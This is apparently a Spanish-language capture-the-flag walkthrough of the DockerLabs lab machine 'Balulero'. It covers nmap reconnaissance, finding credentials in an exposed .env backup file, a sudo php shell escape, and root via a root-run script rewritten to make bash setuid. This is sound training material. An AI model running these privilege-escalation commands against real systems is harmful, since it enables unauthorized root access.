#MAQUINA #DOCKERLABS #FACIL
<hr>

# RECONOCIMIENTO

Vamos a resolver **Balulero** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS --min-rate 5000 -vvv -n -Pn -p- 172.17.0.2 --open
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-10 11:27 CET
Initiating ARP Ping Scan at 11:27
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 11:27, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:27
Scanning 172.17.0.2 [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 11:27, 0.50s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2024-12-10 11:27:19 CET for 0s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)


```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)** y el puerto **22(SSH)** abiertos.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p22,80 172.17.0.2                      
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-10 11:28 CET
Nmap scan report for pressenter.hl (172.17.0.2)
Host is up (0.000026s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fb:64:7a:a5:1f:d3:f2:73:9c:8d:54:8b:65:67:3b:11 (RSA)
|   256 47:e1:c1:f2:de:f5:80:0e:10:96:04:95:c2:80:8b:76 (ECDSA)
|_  256 b1:c6:a8:5e:40:e0:ef:92:b2:e8:6f:f3:ad:9e:41:5a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Mi Landing Page - Ciberseguridad
|_http-server-header: Apache/2.4.41 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.54 seconds




```

   ```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-10 11:28 CET
Nmap scan report for pressenter.hl (172.17.0.2)
Host is up (0.0000030s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds



```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.
## HTTP (80)

Al revisar la web que hay en el puerto 80, si inspeccionamos y nos vamos a **Console** :

   ```bash

Se ha prohibido el acceso al archivo .env, que es donde se guarda la password de backup, pero hay una copia llamada .env_de_baluchingon visible jiji

```

Y si nos vamos a http://172.17.0.2/.env_de_baluchingon :

   ```bash

balu:balubalulerobalulei

```


# ESCALADA PRIVILEGIOS

Vemos si el usuario tiene permisos SUDO:
   ```bash
   
balu@1f27ab38ef44:~$ sudo -l
Matching Defaults entries for balu on 1f27ab38ef44:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User balu may run the following commands on 1f27ab38ef44:
    (chocolate) NOPASSWD: /usr/bin/php



```

Vemos **php** con permisos SUDO :
   ```bash
   
balu@1f27ab38ef44:~$ sudo -u chocolate php -r "system('/bin/bash');"
chocolate@1f27ab38ef44:/home/balu$ 

```

YA ESTAMOS COMO CHOCOLATE.

AL hacer **ps -ef** , vemos que root ejecuta un script de chocolate, todo el rato :

   ```bash
   
chocolate@1f27ab38ef44:/opt$ ps -ef
UID          PID    PPID  C STIME TTY          TIME CMD                                                                                                               
root           1       0  0 10:26 ?        00:00:00 /bin/sh -c service apache2 start && a2ensite 000-default.conf && service ssh start && while true; do php /opt/script.php; sleep 5; done


```

Al ser nuestro script, le ponemos otros permisos menos restrictivos (y root pueda ejecutarlo) y lo modificamos :

   ```bash
   
chocolate@1f27ab38ef44:/opt$ chmod 777 script.php 
chocolate@1f27ab38ef44:/opt$ cat script.php 
<?php system('chmod +s /usr/bin/bash'); ?>
chocolate@1f27ab38ef44:/opt$ ls -la /usr/bin/bas
base32    base64    basename  bash      bashbug   
chocolate@1f27ab38ef44:/opt$ ls -la /usr/bin/bash
-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /usr/bin/bash
chocolate@1f27ab38ef44:/opt$ /usr/bin/bash -p
bash-5.0# whoami
root
```

**YA ESTAMOS COMO ROOT.**